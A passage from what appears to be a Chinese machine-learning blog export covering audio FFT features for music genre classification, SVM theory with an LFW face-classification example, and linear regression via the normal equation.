wavfile.read(path+mtype+\u0026#34;/converted/\u0026#34;+mtype+\u0026#34;.\u0026#34;+mserial+\u0026#34;.au.wav\u0026#34;) time = np.linspace(0,30,len(X)) plt.plot(time,X) plt.title(\u0026#34;magnitude_time:\u0026#34;+ mtype + \u0026#34;-\u0026#34; + mserial[-1]) plt.ylabel(\u0026#39;magnitude\u0026#39;) plt.xlabel(\u0026#39;time\u0026#39;) def magnitude_frequence(mtype,mserial): sample_rate,X = wavfile.read(path+mtype+\u0026#34;/converted/\u0026#34;+mtype+\u0026#34;.\u0026#34;+mserial+\u0026#34;.au.wav\u0026#34;) N = len(X) freqs = fftfreq(N, 1/sample_rate)[:N//2] mag = np.abs(fft(X))[:N//2] plt.plot(freqs,mag) plt.title(\u0026#34;magnitude_frequence:\u0026#34;+ mtype + \u0026#34;-\u0026#34; + mserial[-1]) plt.ylabel(\u0026#39;magnitude\u0026#39;) plt.xlabel(\u0026#39;frequence\u0026#39;) types = [\u0026#39;blues\u0026#39;,\u0026#39;classical\u0026#39;,\u0026#39;country\u0026#39;,\u0026#39;disco\u0026#39;,\u0026#39;hiphop\u0026#39;,\u0026#39;jazz\u0026#39;,\u0026#39;metal\u0026#39;,\u0026#39;pop\u0026#39;,\u0026#39;reggae\u0026#39;,\u0026#39;rock\u0026#39;] serials = [\u0026#39;00000\u0026#39;,\u0026#39;00001\u0026#39;,\u0026#39;00002\u0026#39;] types = types[:] serials = serials[:] plt.figure(num=None,figsize=(8*len(serials),5*len(types)),dpi=80) for index,(t,s) in enumerate(product(types,serials)): plt.subplot(len(types),len(serials),index+1) frequence_time(t,s) plt.show() plt.figure(num=None,figsize=(8*len(serials),5*len(types)),dpi=80) for index,(t,s) in enumerate(product(types,serials)): plt.subplot(len(types),len(serials),index+1) magnitude_time(t,s) plt.show() # plt.figure(num=None,figsize=(8*len(serials),5*len(types)),dpi=80) # for index,(t,s) in enumerate(product(types,serials)): # plt.subplot(len(types),len(serials),index+1) # magnitude_frequence(t,s) types = [types[i] for i in list(np.sort(np.random.choice(range(len(types)),size=5,replace=False)))] serials = serials[:1] plt.figure(num=None,figsize=(8*len(types),5*3),dpi=80) for index,(t,s) in enumerate(product(types,serials)): plt.subplot(3,len(types),0*len(types)+index+1);frequence_time(t,s) plt.subplot(3,len(types),1*len(types)+index+1);magnitude_time(t,s) plt.subplot(3,len(types),2*len(types)+index+1);magnitude_frequence(t,s) plt.show() ​ ​\n0、初始化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from scipy.fft import fft # 快速傅里叶转换 from scipy.io import wavfile # 读取wav文件格式 from matplotlib.pyplot import specgram as spg # 绘制频谱图 from itertools import product import matplotlib.pyplot as plt import numpy as np import os from sklearn.pipeline import Pipeline from sklearn.preprocessing import StandardScaler from sklearn.linear_model import LogisticRegression from sklearn.model_selection import train_test_split path = \u0026#34;./Dataset/2_Music_Classifier/\u0026#34; model_path = \u0026#34;D:/MLab/project/StuML/ML/Model/2_Music_Classifier/\u0026#34; max_len = 660000 labels = dict([(label_name,label_num) for label_num,label_name in enumerate(os.listdir(path))]) 1、数据处理与特征存储 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 y = [];X=[] for label_name in labels.keys(): sub_path = path+label_name+\u0026#34;/converted/\u0026#34; for wave_file_name in os.listdir(sub_path): y.append(labels[label_name]) X.append( abs( # 取幅值（实部和虚部的平方和开根号） fft( # 傅里叶变换 wavfile.read( # 读取 sub_path+wave_file_name )[1][:max_len] # 切片 ) ) ) X_train,X_test,y_train,y_test = train_test_split( X,y, test_size=0.1, random_state=200304, stratify=y ) # 特征存储 np.save(model_path+\u0026#34;train_feature\u0026#34;,X_train) np.save(model_path+\u0026#34;train_label\u0026#34;,y_train) np.save(model_path+\u0026#34;test_feature\u0026#34;,X_test) np.save(model_path+\u0026#34;test_label\u0026#34;,y_test) 2、模型训练与存储 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 X = np.load(model_path+\u0026#34;train_feature.npy\u0026#34;) y = np.load(model_path+\u0026#34;train_label.npy\u0026#34;) log_reg = Pipeline([ (\u0026#39;scaler\u0026#39;,StandardScaler()), (\u0026#39;clf\u0026#39;,LogisticRegression( max_iter=10000, # solver=\u0026#39;sag\u0026#39; )) ]) log_reg.fit(X,y) with open(model_path+\u0026#34;model_object\u0026#34;,\u0026#34;wb\u0026#34;) as file: pickle.dump(log_reg,file) 3、测试与评估 1 2 3 4 5 6 7 8 X_test = np.load(model_path+\u0026#34;test_feature.npy\u0026#34;) y_test = np.load(model_path+\u0026#34;test_label.npy\u0026#34;) with open(model_path+\u0026#34;model_object\u0026#34;,\u0026#34;rb\u0026#34;) as file: log_reg = pickle.load(file) log_reg.score(X_test,y_test) # log_reg.score(X_train,y_train) 0.6 支持向量机（SVM，Support Vector Machine）与感知机（Perceptron） SVM是一种二分类算法，是对Perceptron模型的扩展,具有更强的泛化能力 SVM/Perceptron模型： $$ y=\\operatorname{sign}(\\theta x)= \\begin{cases} +1, \u0026 \\theta x\u003e0 \\\\ -1, \u0026 \\ \\theta x\u003c0 \\end{cases} $$ 间隔：样本到超平面的距离 几何距离：$\\displaystyle{\\gamma = \\frac{|w^tx_0+b|}{||w||}}$，其中超平面为 $\\displaystyle{w^tx+b=0}$ 对于正确分类的样本点，有 $$\\displaystyle{\\gamma = \\frac{y_0(w^tx_0+b)}{\\sqrt{w^tw}} = \\frac{y_0(\\hat y_0+b)}{\\sqrt{w^tw}}}$$ 函数距离：$\\displaystyle{\\delta=|w^tx_0+b|}$ 对于正确分类的样本点，有 $$\\displaystyle{\\delta=|w^tx_0+b|=y_0(w^tx_0+b)}$$ 硬间隔：要求所有样本都必须正确分类，不允许任何错误 软间隔：允许部分样本分类错误，容忍一定程度的误差，以获得更好的泛化能力 支持向量：离分割超平面最近的那些样本点 Perceptron思想：期望使分类错误的所有样本（m条）到超平面的距离之和最小 $$\\displaystyle{J(\\theta)=\\sum_{i\\in M_\\theta}\\frac{-y^i(\\theta^T x^i+b)}{||\\theta||}}\\Rightarrow \\displaystyle{J(\\theta)=-\\sum_{i\\in M_\\theta}{y^i(\\theta^T x^i+b)}}$$，其中 $M_\\theta$ 为分类错误集 优化：随机梯度下降法（SGD）或小批量梯度下降法（MBGD） $$\\displaystyle{\\nabla_\\theta J(\\theta) = -\\sum_{i\\in M_\\theta}y^{(i)}x^{(i)}}$$$，注意，这里的梯度函数表达式内部虽然与 $\\theta$ 无关，但错误集 $M_\\theta$ 却与 $\\theta$ 相关 SVM思想：期望使离超平面比较近的点尽可能地远离超平面 —— 二次优化 线性可分支持向量机：硬间隔最大化（完美分类正负例且距离超平面最近的点离超平面越远越好） 损失函数：求解（拉格朗日条件约束）： $$ \\begin{aligned} \u0026 \\displaystyle{\\max\\limits_{w,b}\\ \\gamma_{min}=\\frac{y_{min}(w^Tx_{min}+b)}{||w||}}\\\\ s.t. \\quad \u0026\\displaystyle{{\\gamma}_{i} = \\frac{y_i(w^Tx_i+b)}{||w||}\\ge \\gamma_{min} ,i \\in \\{1,2,\\ldots m\\}} \\\\ \\end{aligned} $$ 令 $y_{min}(wx_{min}+b) = 1$，则原式等价于 （损失函数）： $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_{w,b}\\ \\frac{1}{2}{||w||^2}}\\\\ s.t. \\quad \u0026\\displaystyle{y_i(w^Tx_i+b)\\ge 1 ,i \\in \\{1,2,\\ldots m\\}} \\\\ \\end{aligned} $$ 二次规划： 构建拉格朗日函数： $$\\displaystyle{ L(w,b,\\alpha)=\\frac{1}{2}||w||^2-\\sum^m_{i=1}\\alpha_i[y_i(w^Tx_i+b)-1], \\alpha_i \\ge 0}$$ 求解 $$\\displaystyle{\\min\\limits_{w,b}\\max\\limits_{\\alpha_i\\ge 0}L(w,b,\\alpha) \\overset{\\text{对偶函数}}{\\Leftrightarrow} \\max\\limits_{\\alpha_i\\ge 0}\\min\\limits_{w,b}L(w,b,\\alpha)}$$ 原问题等价于（SMO算法推导）： $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_j(x_i·x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\} \\\\ \u0026\\displaystyle{ \\alpha_i \\ge 0} \u0026,i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ 求 $w^* \\text{与} b^*$ ： $$ \\begin{cases} \\displaystyle{w^* = \\sum^m_{i=1}{\\alpha^*}_iy_ix_i}\\\\ \\displaystyle{y_s({w^*}^Tx_s+b^*)=1,\\quad x_s为任意支持向量}\\\\ \\displaystyle{\\alpha^*(y_s({w^*}^Tx_s+b^*)-1)=0,\\quad 可获得支持向量} \\end{cases} $$ 预测函数：$$\\hat y = ({w^*}^T x+b^*)$$ 线性支持向量机（线性不可分）：软间隔最大化（在硬间隔的基础上引入松弛变量 $\\xi_i \\ge 0$ ） 损失函数：求解（拉格朗日条件约束）： $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_{w,b} \\frac{1}{2}{||w||^2} + C{\\sum^m_{i=1}\\xi_i}}\\\\ s.t. \\quad \u0026\\displaystyle{y_i(w^Tx_i+b)\\ge 1-\\xi_i} \u0026, i \\in \\{1,2,\\ldots m\\} \\\\ \u0026\\displaystyle{ \\xi_i \\ge 0}\u0026, i \\in \\{1,2,\\ldots m\\} \\end{aligned} $$ 二次规划： 构建拉格朗日函数： $$ \\displaystyle{ L(w,b,\\xi,\\alpha,\\mu)=\\frac{1}{2}||w||^2+C\\sum^m_{i=1}\\xi_i-\\sum^m_{i=1}\\alpha_i[y_i(w^Tx_i+b)-1+\\xi_i]-\\sum^m_i\\mu_i\\xi_i, \\alpha_i,\\xi_i \\ge 0} $$ 求解 $\\displaystyle{\\min\\limits_{w,b,\\xi}\\max\\limits_{\\alpha_i\\ge 0,\\xi_i\\ge 0}L(w,b,\\xi,\\alpha,\\mu) \\overset{\\text{对偶函数}}{\\Leftrightarrow} \\max\\limits_{\\alpha_i\\ge 0,\\xi_i\\ge 0}\\min\\limits_{w,b,\\xi}L(w,b,\\xi,\\alpha,\\mu)}$ 原问题等价于（SMO算法推导）： $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_j(x_i·x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\}\\\\ \u0026 0 \\le \\alpha_i \\le C \u0026 , i\\in \\{1,2,\\ldots m\\}\\\\ % \u0026 \\xi_i \\ge 0 \u0026 , i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ 对于支持样本 $x_i$: $\\alpha_i = 0$ : $x_i$ 被正确分类 $0 \u0026lt; \\alpha_i \u0026lt; C$ : $x_i$ 在软边界上 $\\alpha_i = C$ : $x_i$ 嵌入软边界内 $\\xi \u0026lt; 1$ : $x_i$ 被正确分类 $\\xi = 1$ : $x_i$ 在超平面上 $\\xi \u0026gt; 0$ : $x_i$ 被错误分类 求 $w^* \\text{与}b^*$ ： $$ \\begin{cases} \\displaystyle{w^* = \\sum^m_{i=1}{\\alpha}_i^*y_ix_i}\\\\ \\displaystyle{y_s({w^*}^Tx_s+b^*)=1,\\quad x_s为任意支持向量}\\\\ \\displaystyle{\\alpha^*(y_s({w^*}^Tx_s+b^*)-1)=0,\\quad 可获得支持向量} \\end{cases} $$ 非线性支持向量机：升维（核函数Kernel） 定义Kernel函数：$K(x,z) = \\phi(x)\\phi(z)$ 此时对偶处理后的目标函数为： $$ \\begin{aligned} \u0026 \\displaystyle{\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_jK(x_i,x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\}\\\\ \u0026 0 \\le \\alpha_i \\le C \u0026 , i\\in \\{1,2,\\ldots m\\}\\\\ % \u0026 \\xi_i \\ge 0 \u0026 , i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ 常用Kernel函数： 线性Kernel函数： $K(x,z)=x \\cdot z$ 多项式Kernel函数： $K(x,z)=(\\gamma x \\cdot z + r)$ 高斯Kernel函数： $K(x,z)=\\exp(-\\gamma||x-z||^2)$ Sigmoid Kernel函数：$K(x,z)=\\tanh(\\gamma x \\cdot z + r)$ SMO算法 SVM算法关键步骤： 支持向量机算法最优化问题（指定惩罚系数C）： $$ \\begin{aligned} \u0026 \\displaystyle{J(\\alpha)=\\min\\limits_\\alpha \\frac{1}{2}\\sum^m_{i=1}\\sum^m_{j=1}\\alpha_i\\alpha_jy_iy_j(x_i·x_j)-\\sum^m_{i=1}\\alpha_i}\\\\ s.t. \\quad \u0026\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}\u0026,i\\in \\{1,2,\\ldots m\\}\\\\ \u0026 0 \\le \\alpha_i \\le C \u0026 , i\\in \\{1,2,\\ldots m\\}\\\\ % \u0026 \\xi_i \\ge 0 \u0026 , i\\in \\{1,2,\\ldots m\\} \\end{aligned} $$ 等价于求解 ： $$ \\begin{cases} \\displaystyle{w^* = \\sum^m_{i=1}{\\alpha}_i^*y_ix_i}\\\\ \\displaystyle{y_s({w^*}^Tx_s+b^*)=1,\\quad x_s为任意支持向量}\\\\ \\displaystyle{\\alpha^*(y_s({w^*}^Tx_s+b^*)-1)=0,\\quad 可获得支持向量} \\end{cases} $$ 预测函数： $\\displaystyle{f(x)=sign(\\sum^m_{i=1}\\alpha_i^y_iK(x,x_i)+b^)}$ SMO算法求解最优化问题 求解 $\\alpha_i, i\\in {1,2,\\dots m}$ 算法思想： 由于 $\\displaystyle{\\sum^m_{i=1}\\alpha_iy_i=0}$ ，故不能只固定一个参数 将原始求解m个参数二次规划问题分解成多个子二次规划问题分别求解，每个子问题只求解2个参数 采用启发式方法选择需要更新的两个参数 $\\alpha_i $ 和 $\\alpha_j$ 例如，选择 $\\alpha_1$ 和 $\\alpha_2$ 优化 $\\alpha_i $ 和 $\\alpha_j$ 使目标函数最大程度接近全局最优解（$\\nabla_{\\alpha_i,\\alpha_j}J(\\alpha)=0$），其余参数不变 $$\\displaystyle{\\min\\limits_{\\alpha_1,\\alpha_2}J(\\alpha_1,\\alpha_2)=\\min\\limits_{\\alpha_1,\\alpha_2}\\frac{1}{2}K_{11}\\alpha_1^2+\\frac{1}{2}K_{22}\\alpha_2^2+y_1y_2K_{12}\\alpha_1\\alpha_2-(\\alpha_1+\\alpha_2)+y_1v_1\\alpha_1+y_2v_2\\alpha_2+Constant}$$ ，其中 $$v_i = \\displaystyle{\\sum^m_{j=3}\\alpha_jy_jK(x_i,x_j), i = 1,2}$$ 将二元函数视为一元函数 另 $$\\alpha_1 = (\\zeta-y_2\\alpha_2)y_1$$ ，带回上式 $$\\displaystyle{\\min\\limits_{\\alpha_2}J(\\alpha_2)=\\min\\limits_{\\alpha_2}\\frac{1}{2}K_{11}(\\zeta-y_2\\alpha_2)y_1^2+\\frac{1}{2}K_{22}\\alpha_2^2+y_1y_2K_{12}(\\zeta-y_2\\alpha_2)y_1\\alpha_2-((\\zeta-y_2\\alpha_2)y_1+\\alpha_2)+y_1v_1(\\zeta-y_2\\alpha_2)y_1+y_2v_2\\alpha_2+Constant}$$ 对 $J(\\alpha_2)$ 求导，导数为0 $$ \\begin{aligned} \\displaystyle{v_1 = f(x_1)-\\sum^2_{j=1}y_j\\alpha_jK_{1j}-b} \\\\ \\displaystyle{v_2 = f(x_2)-\\sum^2_{j=1}y_j\\alpha_jK_{2j}-b} \\end{aligned} $$ $$\\displaystyle{\\alpha^{new,unclipped}_2 = \\alpha^{old}_2 + \\frac{y_2(E_1-E_2)}{\\eta}}$$，其中 $$\\alpha_2^{new,unclipped}$$ 为未考虑约束的新值， $$E_i = f(x_i)-y_i, \\ \\eta = K_{11}+K_{22}-2K_{12}$$ 对新值进行约束修建 $$ \\begin{aligned} \u0026 0 \\le \\alpha_1,\\alpha_2 \\le C \\\\ \u0026 \\alpha_1 + \\alpha_2 = \\zeta \\end{aligned} $$ 当 $y_1 \\neq y_2$ 时， $$ L=\\max(0,\\alpha^{old}_2-\\alpha^{old}_1),H=\\min(C,C+\\alpha^{old}_2-\\alpha^{old}_1) $$ 当 $y_1 \\neq y_2$ 时，$$L=\\max(0,\\alpha_1^{old}+\\alpha_2^{old}-C);H=\\min(C,\\alpha_2^{old}+\\alpha_1^{old})$$ $$ \\alpha_2^{\\text{new}} = \\begin{cases} H \u0026, \\alpha_2^{\\text{new,unclipped}} \u003e H \\\\ \\alpha_2^{\\text{new,unclipped}} \u0026, L \\le \\alpha_2^{\\text{new,unclipped}} \\le H \\\\ L \u0026, \\alpha_2^{\\text{new,unclipped}} \u003c L \\end{cases} $$ 启发式选择变量 第一个变量的选择称为外循环，首先遍历整个样本集，选择违反KKT条件的 $\\alpha_i$ 作为第一个变量。依据相关规则选择第二个变量，对这两个变量采用上述方法进行优化。直到遍历整个样本集后，没有违反KKT条件 $\\alpha_i$ ，然后退出 KKT条件： $$ \\begin{aligned} \u0026 \\alpha_i = 0 \u0026 \\Rightarrow \u0026 \\qquad y^{(i)}(w^Tx^{(i)}+b) \\ge 1 \\\\ \u0026 \\alpha_i = C \u0026 \\Rightarrow \u0026 \\qquad y^{(i)}(w^Tx^{(i)}+b) \\le 1 \\\\ \u0026 0 \u003c \\alpha_i \u003c C \u0026 \\Rightarrow \u0026 \\qquad y^{(i)}(w^Tx^{(i)}+b) = 1 \\\\ \\end{aligned} $$ 第二个变量的选择成为内循环，假设在外循环中找到第一个变量记为 $\\alpha_1$ ，第二个变量的选择希望能使 $\\alpha_2$ 有较大变化。由于 $\\alpha_2$ 是依赖于 $|E_1-E_2|$ ，当 $E_1$ 为正时，那么选择最小的 $E_i$ 作为 $E_2$ ；如果 $E_1$ 为负时，选择最大的 $E_i$ 作为 $E_2$ ，通常为每个样本的 $E_i$ 保存在一个列表中，选择最大的 $|E_1-E_2|$ 来近似最大化步长。 SVM概率化输出 目的：将决策值映射为概率（如 $P(y=1∣x)\\in[0,1]$），使用户能判断样本属于某类的可能性大小 标准的SVM的无阈值输出为：$f(x)=h(x)+b$ ，其中 $h(x)=\\displaystyle{\\sum_iy_i\\alpha_iK(x_i,x)}$ Platt利用 sigmoid-fitting 方法，将标准的SVM的输出结果进行后处理，转换为后验概率 $P(y=1|f)=\\displaystyle{\\frac{1}{1+\\exp(Af+B)}}$ ，其中 $A$ 和 $B$ 为待拟合参数，$f$ 为样本 $x$ 的无阈值输出。 SVM合页损失 0-1损失是二分类问题的真正损失函数，合页损失与logistic损失是对0-1损失函数的近似 合页损失函数(Hinge Loss Function)：$L(y(wx+b))=[1-y(wx+b)]+$ ， $[]+$ 表示： $$ [z]_+ = \\begin{cases} z\u0026,z\u003e0 \\\\ 0\u0026,z\\le 0 \\end{cases} $$ 也就是说，数据点如果被正确分类，损失为0，如果没有被正确分类，损失为z SVM的损失函数就是合页损失函数+正则化项: $$\\displaystyle{\\min\\limits_{w,b}\\sum^m_{i=1}L(y^{(i)}(w^Tx^{(i)}+b)) + \\lambda ||w||^2}$$ 上述目标函数中，当 $\\displaystyle{\\lambda = \\frac{1}{2C}}$ 时。等价于原目标函数 $$\\displaystyle{\\frac{1}{2}||w||^2+C\\sum^m_{i=1}\\xi_i}$$ 实践-人脸分类器 基于 sklearn 内置 LFW 数据集 + SVM 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import numpy as np import matplotlib.pyplot as plt from sklearn.datasets import fetch_lfw_people from sklearn.model_selection import train_test_split from sklearn.preprocessing import StandardScaler from sklearn.decomposition import PCA from sklearn.svm import SVC from sklearn.pipeline import Pipeline from sklearn.metrics import classification_report,accuracy_score # 1、加载人脸数据 lfw_people = fetch_lfw_people(min_faces_per_person=70,resize=0.4) X,y,names = (lfw_people.data,lfw_people.target,lfw_people.target_names) n_classes = names.shape[0] print(\u0026#34;数据集规模：\u0026#34;,X.shape) print(\u0026#34;类别数：\u0026#34;,n_classes) print(\u0026#34;类别名：\u0026#34;,names) print() # 2、划分数据集与训练集 X_train,X_test,y_train,y_test = train_test_split(X,y,test_size=0.25,random_state=428,stratify=y) # 3、构建机器学习通道 pipe = Pipeline([ # 先降维，再归一，再SVM ( \u0026#39;pca\u0026#39;, PCA( n_components=150, # 只保留150个主成分（把原始11750维降到150维） whiten=True, # 白化：150维特征缩放到同尺度，去相关 random_state=428 ) ), ( \u0026#39;scaler\u0026#39;, StandardScaler() # 对PCA后的150维特征进行归一化 ), ( \u0026#39;svm\u0026#39;, SVC( kernel=\u0026#39;rbf\u0026#39;, # 使用高斯核函数进行非线性升维 class_weight=\u0026#39;balanced\u0026#39;, # 自动根据各类样本量给出权重，防止某些人照片多导致偏向性 C=5.0, # 正则强度，C越大越不允许误分，可能导致过拟合；C约小margin越大可能导致欠拟合 gamma=\u0026#39;scale\u0026#39; # 高斯核宽度gamma的取值策略 ) ) ]) # 4、训练模型 print(\u0026#34;开始训练 SVM ...\u0026#34;) pipe.fit(X_train,y_train) print(\u0026#34;训练完成\u0026#34;) print() # 5、评估模型 y_pred = pipe.predict(X_test) print(f\u0026#34;\\n测试集整体准确率：{pipe.score(X_test,y_test):.3f}\u0026#34;) print(\u0026#34;\\n详细分类报告：\u0026#34;) print(classification_report(y_test, y_pred, target_names=names)) 数据集规模： (1288, 1850) 类别数： 7 类别名： ['Ariel Sharon' 'Colin Powell' 'Donald Rumsfeld' 'George W Bush' 'Gerhard Schroeder' 'Hugo Chavez' 'Tony Blair'] 开始训练 SVM ... 训练完成 ​ ​ 测试集整体准确率：0.851 ​ ​ 详细分类报告： ​ precision recall f1-score support ​ Ariel Sharon 1.00 0.47 0.64 19 Colin Powell 0.84 0.90 0.87 59 Donald Rumsfeld 0.95 0.70 0.81 30 George W Bush 0.80 0.98 0.88 133 Gerhard Schroeder 0.95 0.78 0.86 27 Hugo Chavez 1.00 0.56 0.71 18 Tony Blair 0.91 0.83 0.87 36\naccuracy 0.85 322 macro avg 0.92 0.75 0.81 322 weighted avg 0.87 0.85 0.84 322 ​\n","date":"2025-12-02T18:51:05+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/SVM_hu_567b260b9cac608.jpg","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB/","title":"机器学习-线性分类"},{"content":" 目录 一、正规方程（Normal Equation） 1、一维线性回归（代码实现） 2、高维线性回归（代码实现） 3、高维线性回归（sklearn库） 二、梯度下降（Gradient Descent） 1、批量梯度下降（GD） 代码实现 2、随机梯度下降（SGD） (1)、代码实现 (2)、小幅优化：打乱数据索引，顺序选取向量 3、小批量梯度下降（Mini-batch SGD） (1)、代码实现 (2)、小幅优化：打乱数据索引，顺序批量选取向量 4、SGD的sklearn库实现 5、梯度下降法的问题与解决思路 （1）、确定速率调整函数 （2）、更改学习速率 三、坐标下降（Coordinate Descent） 代码实现 四、归一化（Normalization） 五、正则化（Regularization） 1、Lasso回归（sklearn库） 2、Ridge回归（sklearn库） 3、ElasticNet回归（sklearn库） 4、随机梯度下降实现elasticnet正则化（sklearn库） 六、升维方法 — 多项式回归（Polynomial Regression） 七、实践 — 保险花销预测 1、数据提取 2、EDA（Exploratory Data Analysis，探索性数据分析） 3、特征工程 4、模型训练 5、模型评估 6、进阶 线性回归（Linear Regression） 任务类型分类：有监督学习 定义：拟合因变量(向量) y 与 x 之间呈线性关系，即 $\\mathbf{y} = \\mathbf{w}^T\\mathbf{x} + \\mathbf{b}$，其中 $\\mathbf{x,y,w,b \\in \\mathbb{R}^n}$ 目标：寻找参数最优解使得$\\operatorname{Loss}$函数最小。$(\\hat{\\mathbf{w}}, \\hat{\\mathbf{b}}) = \\operatorname{Loss}(\\mathbf{y}, \\hat{\\mathbf{y}}) \\Leftrightarrow\\operatorname{Argmin}(\\operatorname{Loss}(\\mathbf{w}, \\mathbf{b}))$ 多元线性回归常用损失函数 —— MSE(均方误差，由似然函数推导而来): $$ \\displaystyle{\\operatorname{\\mathit{J}(\\theta)} = \\frac{1}{2} \\displaystyle \\sum_{i=1}^{m} (h_\\theta(x^{(i)}) - y^{(i)})^2 = \\frac{1}{2}(X\\theta - y)^T(X\\theta - y) = \\frac{1}{2}(\\theta^TX^TX\\theta - \\theta^TX^Ty - y^TX\\theta + y^Ty)},系数可为\\displaystyle{\\frac{1}{2}、\\frac{1}{n}、\\frac{1}{2n}} $$ MSE对 $\\theta$ 的梯度: $$ \\displaystyle{\\frac{\\partial{J}(\\theta)}{\\partial\\theta} = X^TX\\theta - X^Ty = 0 \\Rightarrow \\theta = (X^TX)^{-1}X^Ty} $$ 一、正规方程（Normal Equation） 参数解析解： $\\hat{\\theta} = (X^TX)^{-1}X^Ty$ 可能存在的问题：$(X^TX)^{-1}$的求解可能比较困难 1、一维线性回归（代码实现） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import numpy as np import matplotlib.pyplot as plt np.random.seed(20030428) # 数据量 m = 100 # 随机生成 x 序列 x = np.random.rand(m,1) * 2 # 模拟 x 对应的 y 标签，误差呈正态分布 y = 5 + x*4 + np.random.randn(m,1) # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 参数的求解公式 w_hat = np.linalg.inv(X.T.dot(X)).dot(X.T).dot(y) # 预测 x_pre = [[0.5],[1.5]] X_pre = np.c_[np.ones((2,1)),x_pre] y_pre = X_pre.dot(w_hat) plt.scatter(x,y,label=\u0026#39;Original Data\u0026#39;) plt.scatter(x_pre,y_pre,label=\u0026#39;Predicted Data\u0026#39;) plt.plot(x,X.dot(w_hat),label=\u0026#39;Regression Model\u0026#39;) plt.legend() plt.show() 2、高维线性回归（代码实现） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import numpy as np np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) # 参数的求解公式 w_hat = np.linalg.inv(X.T.dot(X)).dot(X.T).dot(y) print(\u0026#39;W_hat:\u0026#39;) print(w_hat.reshape(1,n+1)) # 预测 X_pre = np.c_[np.ones((3,1)),x_pre] y_pre = X_pre.dot(w_hat) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02671056 3.98404888 4.00452019 4.9783491 1.02490084]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23707594] [68.2285754 ] [75.97196488]] 3、高维线性回归（sklearn库） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import numpy as np from sklearn.linear_model import LinearRegression np.random.seed(20030428) # 维度 n = 4 # 数据量 m = 1000 # 设置预测值 x_pre = np.random.random(size = (3,n))*10 # 随机生成 x 序列 x = np.random.rand(m,n) * 2 # 补充 x0 列 X = np.c_[np.ones((m,1)),x] # 模拟 x 对应的 y 标签，误差呈正态分布 w = np.random.randint(0,6,size=(n+1,1)) y = X.dot(w) + np.random.randn(m,1) reg = LinearRegression(fit_intercept=True) reg.fit(x,y) print(\u0026#39;W_hat:\u0026#39;) print(np.c_[reg.intercept_,reg.coef_]) # 预测 y_pre = reg.predict(x_pre) print(\u0026#39;X_pre: \u0026#39;) print(x_pre) print(\u0026#39;Y_pre: \u0026#39;) print(y_pre) W_hat: [[5.02671056 3.98404888 4.00452019 4.9783491 1.02490084]] X_pre: [[0.03016482 4.79096225 5.74410225 4.2038564 ] [0.0650456 9.53496505 3.37288732 7.77475153] [2.68648726 5.44484467 6.07293252 8.00564199]] Y_pre: [[57.23707594] [68.2285754 ] [75.97196488]] 二、梯度下降（Gradient Descent） 梯度下降法迭代公式：$\\hat\\theta_{k+1} = \\hat\\theta_k - \\alpha \\nabla_{\\theta}J(\\hat\\theta)$, $\\alpha$为学习率 学习率 $\\alpha$ ：$\\alpha$ 设置过大容易造成震荡，$\\alpha$ 设置太小容易造成迭代次数增加，也可能落到局部最优解。一般设置为0.1、0.01、0.001、0.0001 1、批量梯度下降（GD） $$\\displaystyle{\\nabla_{\\theta}J(\\theta) = \\frac{\\partial}{\\partial{\\theta}}J(\\theta) = \\displaystyle \\sum^{m}_{i=1}(h_\\theta(x^{(i)}) - y^{(i)})x^{(i)} = X^T(X\\theta-y)}$$ 代码实现 1 2 3 4 5 6 7 8 